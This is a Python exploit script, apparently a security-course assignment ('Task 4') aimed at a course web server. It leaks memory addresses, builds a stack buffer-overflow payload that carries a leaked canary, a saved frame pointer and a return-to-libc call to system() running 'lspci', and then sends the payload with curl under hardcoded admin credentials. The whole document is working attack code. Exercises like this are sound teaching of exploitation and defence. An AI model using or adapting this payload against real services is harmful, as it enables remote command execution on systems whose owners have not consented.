# Task 4

from sniff_addresses import sniff
import binascii
import subprocess
import os


# Add more zeros if needed and filter all null characters (00 and 000) with = (will be replaced with \0 in for loop)
def filter_nulls(addresses):
    for key, address in addresses.items():
        
        if '0x' in addresses[key]:
            while len(addresses[key]) != 10:
                addresses[key] = '0x' + '0' + addresses[key][2:]

        elif '0x' not in addresses[key]:
            while len(addresses[key]) != 8:
                addresses[key] += '0'
        
        while '000' in addresses[key]:
            addresses[key] = addresses[key].replace('000', '03d')

        while '00' in addresses[key]:
            addresses[key] = addresses[key].replace('00', '3d')

    return addresses


# Remove 0x and reverse hex representation
def reversed_bytes_hex(hex_address):
    hex_address = hex_address[2:][::-1]

    reversed_bytes_hex = ''

    for i in range(0, len(hex_address), 2):
        byte_hex = hex_address[i:i+2][::-1]
        byte_reverse = binascii.unhexlify(byte_hex)

        byte_reverse_hex = binascii.hexlify(byte_reverse).decode('ascii')
        reversed_bytes_hex += byte_reverse_hex

    return reversed_bytes_hex


# url and credentials
url = 'http://project-2.csec.chatzi.org:8000/'

username = 'admin'
password = '8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96'

# Leak the addresses using step 1 attack
addresses = sniff(url=url)

# Getting the reversed hexademical representation for every address that we leaked
# Remove any 00 (NUL) characters for canary and check in general if there is any more

buffer_address_int = int(addresses['buffer'], 16)

addresses = filter_nulls(addresses)

main_address = reversed_bytes_hex(addresses['main'])
system_address =  reversed_bytes_hex(addresses['system']) # system function address
canary = reversed_bytes_hex(addresses['canary'])
ebp = reversed_bytes_hex(addresses['ebp'])
buffer = reversed_bytes_hex(addresses['buffer'])

# Adding necessary padding at start to reach buffer address, then canary and then ebp then the main address to return there
payload = (52 * 'ab') + buffer + (4 * 'ab') + canary + (8 * 'ab') + ebp + system_address + main_address

# Argument address is going to be the buffer address as the starting point
# plus payload size/2 (beacuse every 2 characters there is one byte)
# plus 4 for the actual address of the argument
argument_address = filter_nulls({'argument': reversed_bytes_hex(str(hex(buffer_address_int + int(len(payload)/2) + 4)))})['argument']

# Adding argument in hex representation
argument = binascii.hexlify(b'lspci').decode('ascii')

# Adding 00 (hex form NULL byte) at the end of the payload for strcpy
payload += argument_address + argument + '00'

# Convert string of hex to string of binary
payload = binascii.unhexlify(payload)

# Saving binary payload into a file so curl can read raw binary data
payload_file = 'payload'
with open(payload_file, 'wb') as file:
    file.write(payload)

# Creating headers for POST request
command = f"curl -m 5 -s -X POST --data-binary '@{payload_file}' -H 'Content-Length: 0' -u '{username}:{password}' {url}"

# Running curl
subprocess.run(command, shell=True)

if os.path.exists(payload_file):
    os.remove(payload_file)
